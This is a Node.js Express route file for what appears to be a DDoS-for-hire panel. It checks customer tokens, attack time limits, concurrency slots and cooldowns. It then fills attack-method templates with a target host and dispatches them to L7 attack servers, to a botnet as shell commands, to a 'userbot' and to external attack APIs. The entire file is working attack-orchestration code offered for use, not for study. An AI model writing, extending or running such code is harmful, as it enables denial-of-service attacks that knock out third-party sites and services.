const express = require('express');
const router = express.Router();
const fs = require('fs');
const {
    logger,
    gradient, A, P, rgb,
    pad, truncate, timestamp,
    boxTop, boxBot, boxMid, boxRow,
} = require('../console');


// ─── Helpers ─────────────────────────────────────────────────────────────────
const normalizeTarget = (target) => (target || '').toLowerCase().trim()
    .replace(/^https?:\/\//, '').replace(/^www\./, '')
    .split('/')[0].split('?')[0].split('#')[0];

const isExpired = (createdAt, days) => {
    const expiry = new Date(createdAt);
    expiry.setDate(expiry.getDate() + days);
    return new Date() > expiry;
};

const reject = (res, code, message, extra = {}) => {
    logger.warn('Request rejected', { code, reason: message, ...extra });
    return res.status(code).json({ status: 'error', message, ...extra });
};

const printRequestCard = ({ id, token, target, method, duration, slots, nodes, scripts }) => {
    const W = 70;
    process.stdout.write(`\n  ${boxTop(W, P.info)}\n`);
    process.stdout.write(`  ${boxRow(`${gradient('REQUEST ACCEPTED', P.info)} ${A.dim}${rgb(72, 84, 116)}#${id}${A.reset}`, W, P.info)}\n`);
    process.stdout.write(`  ${boxMid(W, P.info)}\n`);

    const rows = [
        ['Token', token],
        ['Target', truncate(target, 44)],
        ['Method', method],
        ['Duration', `${duration}s`],
        ['Slots', String(slots)],
        ['Routes', String(nodes)],
        ['Scripts', scripts.length ? scripts.join(', ') : 'none'],
        ['Time', timestamp()],
    ];

    rows.forEach(([key, value]) => {
        const label = gradient(pad(key, 10), P.muted);
        const text = `${label} ${A.dim}${rgb(74, 84, 112)}│${A.reset} ${A.brightWhite}${truncate(String(value), 50)}${A.reset}`;
        process.stdout.write(`  ${boxRow(text, W, P.info)}\n`);
    });

    process.stdout.write(`  ${boxBot(W, P.info)}\n\n`);
};

// ─── Main Route ──────────────────────────────────────────────────────────────
router.get('/', async (req, res) => {
    const { token, target, time, method, slot, browser, os, referer, httpmethod, protocol, ratelimit } = req.query;
    const { state, axiosClient, cooldownPath, printAttackStart } = req.app.locals;

    if (!token || !target || !time || !method) {
        return reject(res, 400, 'missing required parameters');
    }

    const tkn = token.toLowerCase();
    const user = state.config[tkn];
    if (!user) return reject(res, 403, 'invalid token');

    // Ensure state exists
    state.cooldownData[tkn] = state.cooldownData[tkn] || { last_attack: 0, created_at: new Date().toISOString() };
    state.activeAttacks[tkn] = state.activeAttacks[tkn] || 0;
    state.activeTargets[tkn] = state.activeTargets[tkn] || [];

    if (isExpired(state.cooldownData[tkn].created_at, user.expiry_days)) {
        return reject(res, 403, 'token expired', { token: tkn });
    }

    const normalizedTarget = normalizeTarget(target);
    // if (state.globalActiveTargets.has(normalizedTarget)) {
    //     return res.status(400).json({ status: 'error', message: 'target already under attack' });
    // }

    const methodData = state.methods[method.toLowerCase()];
    if (!methodData) return reject(res, 400, 'invalid method', { method });

    let actualTime = parseInt(time);
    if (actualTime > user.max_time) {
        return reject(res, 400, 'max time exceeded', { max: user.max_time });
    }

    const slotCount = Math.max(parseInt(slot) || 1, 1);
    if (state.activeAttacks[tkn] + slotCount > user.concurrent) {
        return reject(res, 429, 'concurrent limit reached');
    }

    // Cooldown check
    if (state.activeAttacks[tkn] === 0) {
        const elapsed = Date.now() - new Date(state.cooldownData[tkn].last_attack).getTime();
        const cooldownMs = (user.cooldown || 0) * 1000;
        if (elapsed < cooldownMs) {
            return reject(res, 429, 'cooldown active', { left: Math.ceil((cooldownMs - elapsed) / 1000) });
        }
    }

    // Prepare Commands
    const templates = Array.isArray(methodData.command) ? methodData.command : [methodData.command].filter(Boolean);
    const commands = templates.map(tpl => tpl
        .replaceAll('{host}', target).replaceAll('{time}', actualTime).replaceAll('{slot}', slotCount)
        .replaceAll('{browser}', browser || 'mixed').replaceAll('{os}', os || 'random')
        .replaceAll('{referer}', referer || 'mixed').replaceAll('{httpmethod}', httpmethod || 'get')
        .replaceAll('{protocol}', protocol || 'mixed').replaceAll('{ratelimit}', ratelimit || '64')
    );

    const botCount = (state.bots && methodData.bots !== false) ? state.bots.size : 0;
    const l7Servers = (methodData.l7srv !== false) ? state.serversL7 : [];
    
    if (commands.length === 0 && methodData.external === false && methodData.userbot === false) {
        return reject(res, 503, 'no route available');
    }

    const attackId = Date.now().toString(36) + Math.random().toString(36).slice(2, 5);
    const scriptNames = [...new Set((commands.join(' ').match(/[\w-]+\.(js|go|py|pl|php|sh)/g) || [commands[0]?.split(' ')[0]]))].filter(Boolean);

    // Update State
    state.activeTargets[tkn].push(normalizedTarget);
    // state.globalActiveTargets.add(normalizedTarget);
    state.activeAttacks[tkn] += slotCount;

    state.attackLog.push({ token: tkn, target, method: method.toLowerCase(), time: actualTime, nodes: l7Servers.length + botCount, timestamp: Date.now() });
    if (state.attackLog.length > 2000) state.attackLog.shift();

    printRequestCard({
        id: attackId,
        token: tkn,
        target,
        method: method.toLowerCase(),
        duration: actualTime,
        slots: slotCount,
        nodes: l7Servers.length + botCount,
        scripts: scriptNames,
    });

    // ── Execute L7 Servers (Immediate Bomb & Audit) ──────────────────────────
    if (l7Servers.length > 0) {
        (async () => {
            let success = 0;
            let failed = 0;

            // Fire all nodes immediately in parallel
            const tasks = l7Servers.map(srv => {
                return (async () => {
                    try {
                        await Promise.all(commands.map(cmd => axiosClient.post(srv.host + '/', { command: cmd })));
                        success++;
                        logger.node(`Node signaled`, { name: srv.name, status: 'OK' });
                    } catch (err) {
                        failed++;
                        logger.error(`Node failed`, { name: srv.name, err: err.message });
                    }
                })();
            });

            // Summary appears after all responses are collected
            await Promise.all(tasks);

            logger.ok(`Node dispatch finished`, { 
                target: normalizedTarget,
                success, 
                failed,
                total: l7Servers.length 
            });
        })();
    }

    // ── Execute Bots ─────────────────────────────────────────────────────────
    if (botCount > 0 && typeof global.broadcastBots === 'function') {
        commands.forEach(cmd => global.broadcastBots({ type: 'cmd', cmd: 'shell', args: cmd, meta: { attackId, target, method: method.toLowerCase(), time: actualTime } }));
    }

    // ── Execute Userbot ──────────────────────────────────────────────────────
    if (methodData.userbot !== false && typeof global.userbotSendAttack === 'function') {
        global.userbotSendAttack(target, method.toLowerCase(), actualTime).catch(() => {});
    }

    // ── Execute External APIs ────────────────────────────────────────────────
    if (methodData.external === true && Array.isArray(state.external)) {
        state.external.filter(api => api.enabled).forEach(async api => {
            const apiMethod = (api.methodMap && api.methodMap[method.toLowerCase()]) || method.toUpperCase();
            const max = api.maxTime || 30;
            let rem = actualTime;
            while (rem > 0) {
                const burst = Math.min(rem, max);
                axiosClient.get(api.url.replace('{target}', target).replace('{time}', burst).replace('{method}', apiMethod)).catch(() => {});
                rem -= burst;
                if (rem > 0) await new Promise(r => setTimeout(r, (burst + 1) * 1000));
            }
        });
    }

    if (typeof printAttackStart === 'function') {
        printAttackStart({ target, method, duration: actualTime, nodes: l7Servers.length + botCount });
    }

    res.json({ status: 'success', message: 'attack started', data: { id: attackId, target, method, nodes: l7Servers.length + botCount } });

    // Cleanup Timer
    const timerId = setTimeout(() => {
        const idx = state.activeTargets[tkn]?.indexOf(normalizedTarget);
        if (idx > -1) state.activeTargets[tkn].splice(idx, 1);
        // state.globalActiveTargets.delete(normalizedTarget);
        state.activeAttacks[tkn] = Math.max(0, state.activeAttacks[tkn] - slotCount);
        
        if (state.activeAttacks[tkn] === 0) {
            state.cooldownData[tkn].last_attack = new Date().toISOString();
            fs.writeFileSync(cooldownPath, JSON.stringify(state.cooldownData, null, 2));
        }
        delete state.runningAttacks[attackId];
    }, actualTime * 1000);

    state.runningAttacks[attackId] = { id: attackId, token: tkn, target, normalizedTarget, method: method.toLowerCase(), scriptNames, servers: l7Servers, slotCount, timerId, startedAt: Date.now() };
});

module.exports = router;
